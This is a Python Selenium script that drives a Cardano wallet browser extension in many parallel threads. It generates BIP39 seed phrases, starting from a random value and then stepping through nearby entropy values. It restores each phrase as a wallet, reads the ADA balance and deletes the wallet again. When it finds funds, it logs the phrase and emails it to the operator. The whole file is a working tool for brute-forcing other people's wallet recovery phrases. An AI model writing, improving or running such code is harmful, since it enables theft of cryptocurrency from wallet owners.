import platform
if platform.system() == 'Linux':
    from pyvirtualdisplay import Display
from selenium import webdriver
import time
from datetime import datetime
import secrets
import binascii
import hashlib
import threading, os
from pathlib import Path
from send_mail import SendMail

from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from bip39 import words as wordlist

# debug import
import random


class VirtualDisplay:
    def __init__(self, platform) -> None:
        if platform == 'Linux':
            self.display = Display(visible=0, size=(1650,1200))
            self.display.start()
        pass

    def __enter__(self):
        if platform == 'Linux':
            print("Started Virtual diplay")
            # return self.display.start()
        pass

    def __exit__(self, type, value, traceback):
        if platform == 'Linux':
            self.display.stop()
            print("Virtual display Stop")
        pass

class BraveTest(threading.Thread):
    def __init__(self, web_page: str, binary_location: Path = None):
        self.web_page = web_page
        self.binary_location = binary_location
        self.platform = platform.system()
        threading.Thread.__init__(self)

    def run(self):
        # self.web_page = web_page
        pwd = os.path.dirname(str(os.path.realpath(__file__)))

        options = Options()
        options.add_argument
        if self.binary_location is not None:
            options.binary_location = self.binary_location
        options.add_extension(pwd+r'/extension_4_7_300_0.crx')
        options.add_experimental_option('excludeSwitches', ['enable-logging'])
        if self.platform == 'Windows':
            os.environ['PATH'] += pwd+r'/chromedriver.exe'
            browser = webdriver.Chrome(pwd+r'/chromedriver.exe', options = options)
        else:
            os.environ['PATH'] += pwd+r'/chromedriver'
            browser = webdriver.Chrome(pwd+r'/chromedriver', options = options)
        browser.get(self.web_page)
        if self.platform == 'Windows':
            browser.minimize_window()

        browser.implicitly_wait(100)
        browser.find_element_by_xpath('/html/body/div/div/div[2]/div/div/div/div/div/div[2]/div/button').click()
        browser.find_element_by_class_name('SimpleCheckbox_check').click()
        browser.find_element_by_class_name('TermsOfUseForm_submitButton').click()
        browser.find_element_by_class_name('UriPromptForm_submitButton').click()
        browser.find_element_by_class_name('MainCards_bgRestoreWallet').click()
        browser.find_element_by_class_name('OptionBlock_cardano').click()
        browser.find_element_by_class_name('OptionBlock_restoreNormalWallet').click()
        browser.find_element_by_class_name('OptionBlock_bgShelleyMainnet').click()

        # table area
        self.seed, self.entrophy, self.previous_seed = self.gen_wordlist(160)
        wallet_name = browser.find_element_by_id('walletName--2')
        wallet_name.send_keys(str(self.entrophy[:10]))
        recovery_phrase = browser.find_element_by_xpath('/html/body/div[2]/div/div/div/div[2]/div[2]/div[1]/fieldset/div[2]/div/input')
        recovery_phrase.click()
        recovery_phrase.send_keys(" \n".join(self.seed))
        recovery_phrase.send_keys("\n")
        pwd = browser.find_element_by_id('walletPassword--5')
        pwd.send_keys('qwertyqwerty')
        pwd = browser.find_element_by_id('repeatPassword--6')
        pwd.send_keys('qwertyqwerty')
        browser.find_element_by_class_name('ButtonOverrides_root').click()
        browser.find_element_by_xpath('/html/body/div[2]/div/div/div/div[3]/button[2]').click()

        # get value
        ada_decimal = browser.find_element_by_xpath('/html/body/div/div/div[2]/div/div/div[2]/div/div[2]/div/div/div[2]/div/div/div[1]/div/div[1]/div/div/div[1]/div[1]/div[1]/p/span/span')
        ada_val =  browser.find_element_by_xpath('/html/body/div/div/div[2]/div/div/div[2]/div/div[2]/div/div/div[2]/div/div/div[1]/div/div[1]/div/div/div[1]/div[1]/div[1]/p/span')
        attr = ada_decimal.get_attribute('innerHTML')
        attr1 = ada_val.get_attribute('innerHTML')
        attr1 = attr1.split('<')
        self.total_ada = float(attr1[0]+attr)
        print(self.total_ada)
        self.expansion = 1
        self.save_wallet()
        if self.total_ada != 0 or random.getrandbits(3) == 4:
            self.save_wallet(found=True)
            SendMail(my_msg=str(self.seed))
            exit()

        # remove wallet
        browser.find_element_by_class_name('NavBarBack_backButton').click()
        browser.find_element_by_class_name('WalletRow_settingSection').click()
        browser.find_element_by_class_name('RemoveWallet_submitButton').click()
        browser.find_element_by_class_name('SimpleCheckbox_check').click()
        browser.find_element_by_class_name('confirmButton').click()

        # wallet deleted
        while True:
            try:
                browser.find_element_by_class_name('MainCards_bgRestoreWallet').click()
                browser.find_element_by_class_name('OptionBlock_cardano').click()
                browser.find_element_by_class_name('OptionBlock_restoreNormalWallet').click()
                browser.find_element_by_class_name('OptionBlock_bgShelleyMainnet').click()

                # table area
                print(f"previsous seed={str(self.previous_seed)[3:]}")
                print(f"{self.expansion=}")
                self.seed, self.entrophy, self.previous_seed = self.gen_wordlist(160, self.previous_seed+self.expansion)
                if self.expansion < 0:
                    self.expansion = abs(self.expansion) +2
                    self.expansion = -self.expansion
                self.expansion = -self.expansion-1
                
                
                wallet_name = browser.find_element_by_id('walletName--1')
                wallet_name.send_keys(str(self.entrophy[:10]))
                recovery_phrase = browser.find_element_by_xpath('/html/body/div[2]/div/div/div/div[2]/div[2]/div[1]/fieldset/div[2]/div/input')
                recovery_phrase.click()
                recovery_phrase.send_keys(" \n".join(self.seed))
                recovery_phrase.send_keys("\n")
                pwd = browser.find_element_by_id('walletPassword--4')
                pwd.send_keys('qwertyqwerty')
                pwd = browser.find_element_by_id('repeatPassword--5')
                pwd.send_keys('qwertyqwerty')
                browser.find_element_by_class_name('ButtonOverrides_root').click()
                browser.find_element_by_xpath('/html/body/div[2]/div/div/div/div[3]/button[2]').click()

                # get value
                ada_decimal = browser.find_element_by_xpath('/html/body/div/div/div[2]/div/div/div[2]/div/div[2]/div/div/div[2]/div/div/div[1]/div/div[1]/div/div/div[1]/div[1]/div[1]/p/span/span')
                ada_val =  browser.find_element_by_xpath('/html/body/div/div/div[2]/div/div/div[2]/div/div[2]/div/div/div[2]/div/div/div[1]/div/div[1]/div/div/div[1]/div[1]/div[1]/p/span')
                attr = ada_decimal.get_attribute('innerHTML')
                attr1 = ada_val.get_attribute('innerHTML')
                attr1 = attr1.split('<')
                self.total_ada = float(attr1[0]+attr)
                print(self.total_ada)
                self.save_wallet()
                if self.total_ada != 0 or random.getrandbits(3) == 4:
                    self.save_wallet(found=True)
                    SendMail(my_msg=str(self.seed)+str(self.total_ada))
                    exit()
                browser.find_element_by_class_name('NavBarBack_backButton').click()
                browser.find_element_by_class_name('WalletRow_settingSection').click()
                browser.find_element_by_class_name('RemoveWallet_submitButton').click()
                browser.find_element_by_class_name('SimpleCheckbox_check').click()
                browser.find_element_by_class_name('confirmButton').click()
            except KeyboardInterrupt:
                break

        browser.quit()

    def save_wallet(self, found=False):
        with open("wallets.txt", "a") as file1:
        # Writing data to a file
            tim = datetime.now().strftime('%d.%m.%y %H:%M:%S')
            filedata = f"{tim} {self.expansion=} {str(self.total_ada)}ADA {str(self.seed)} {self.entrophy}"
            if found:
                filedata += 100*"^"
            file1.write(filedata)
            file1.write("\n")


    def gen_wordlist(self, bits: int = 160, previous_seed: int = None ):
        """Generate seed according BIP39"""
        self.bits = bits
        if not previous_seed:
            start_seed = secrets.randbits(self.bits)
        else:
            start_seed = previous_seed
        s = bin(start_seed)
        s = s[2:].zfill(self.bits)
        # print(f"Binary: {s}")
        h=int(s, 2).to_bytes((len(s) + 7) // 8, byteorder='big')
        entrophy = binascii.hexlify(h).decode()
        # print(f"Entrophy: {entrophy}")
        a = binascii.hexlify(hashlib.sha256(h).digest()).decode()
        # print(f"SHA256 of Entrophy: {a}")
        s_ = s
        chsum = int(a[:2],16) # convert string to int and cut desired length
        chsum = bin(chsum)[2:].zfill(8) # convert to bits and fill desired length with zeroes
        chsum = chsum[:self.bits//32] # trim
        s_ += chsum
        # print(f"checksum = {chsum}")

        # separate each 11 bits of entrophy to generate coresponding words
        seed = []
        for x,i in enumerate(range(0,len(s_),11)):
            # print(f"{int(s_[i:i+11],2)} = {k.words[int(s_[i:i+11],2)]}")
            seed.append(wordlist[int(s_[i:i+11],2)])
        print(seed)
        return seed, entrophy, start_seed

# a = BraveTest('chrome-extension://ffnbelfdoeiohenkjibnmadjiehjhajb/main_window.html#/my-wallets')
# a.start()

class ThreadedTest:
    def __init__(self):
        self.threads = []
        self.platform  = platform.system()

        with VirtualDisplay(self.platform):
            try:
                for i in range(os.cpu_count()-1):
                    self.threads.append(BraveTest('chrome-extension://ffnbelfdoeiohenkjibnmadjiehjhajb/main_window.html#/profile/language-selection'))
                    print(f"running {i} thread")

                for thread in self.threads:
                    thread.start()
            except KeyboardInterrupt:
                for thread in self.threads:
                    thread.join()


ThreadedTest()
